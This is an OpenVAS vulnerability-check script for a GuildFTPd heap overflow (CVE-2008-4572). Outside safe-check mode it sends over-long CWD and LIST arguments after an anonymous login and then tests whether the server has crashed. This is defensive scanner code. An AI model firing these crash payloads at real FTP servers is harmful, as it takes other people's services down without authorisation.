###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_guildftpd_heap_bof_vuln.nasl 16 2013-10-27 13:09:52Z jan $
#
# GuildFTPd CWD and LIST Command Heap Overflow Vulnerability
#
# Authors:
# Veerendra GG <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2008 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation allows attackers to execute arbitrary code through
  specially crafted CWD and LIST command, which can also crash the affected
  application.
  Impact Level: Application";
tag_affected = "GuildFTPd Version 0.999.14 and prior on Windows (Any).";
tag_insight = "The flaw exists due to boundary error while processing malformed arguments
  passed to a CWD and LIST commands.";
tag_solution = "No solution or patch is available as of 21st October, 2008. Information
  regarding this issue will updated once the solution details are available.
  For updates refer to http://www.guildftpd.com/";
tag_summary = "This host is running GuildFTPd FTP Server which is prone to Heap
  Overflow Vulnerability.";

if(description)
{
  script_id(800114);
  script_version("$Revision: 16 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 14:09:52 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2008-10-21 16:25:40 +0200 (Tue, 21 Oct 2008)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"risk_factor", value:"Critical");
  script_cve_id("CVE-2008-4572");
  script_bugtraq_id(31729);
  script_name("GuildFTPd CWD and LIST Command Heap Overflow Vulnerability");
  desc = "

  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://milw0rm.com/exploits/6738");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/32218/");
  script_xref(name : "URL" , value : "http://www.frsirt.com/english/advisories/2008/2794");

  script_description(desc);
  script_summary("Check for the version of GuildFTPd Server");
  script_category(ACT_MIXED_ATTACK);
  script_copyright("Copyright (C) 2008 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/ftp", 21);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("ftp_func.inc");
include("version_func.inc");

port = get_kb_item("Services/ftp");
if(!port){
  port = 21;
}

if(!get_port_state(port)){
  exit(0);
}

soc = open_sock_tcp(port);
if(!soc){
  exit(0);
}

banner = recv(socket:soc, length:1024);
if("GuildFTPd" >!< banner)
{
  close(soc);
  exit(0);
}

if(safe_checks())
{
  guildVer = eregmatch(pattern:"Version ([0-9.]+)", string:banner);
  if(guildVer != NULL)
  {
    # Check for GuildFTPd Version <= 0.999.14
    if(version_is_less_equal(version:guildVer[1], test_version:"0.999.14")){
      security_hole(port);
    }
  }
  close(soc);
  exit(0);
}

if(ftp_authenticate(socket:soc, user:"anonymous", pass:"anonymous"))
{
  send(socket:soc, data:string("cwd ", crap(data:"/.", length:200), "\n"));
  recv(socket:soc, length:1024);

  send(socket:soc, data:string("list ", crap(data:"X", length:100), "\r\n"));
  recv(socket:soc, length:1024);

  sleep(10);
  close(soc);

  soc = open_sock_tcp(port);

  if(!recv(socket:soc, length:1024))
  {
    security_note(data:string("GuildFTPd Server service has been crashed on the" +
                              "system.\nRestart the service to resume normal operations."),
                  port:port);
    security_hole(port);
  }
  close(soc);
}
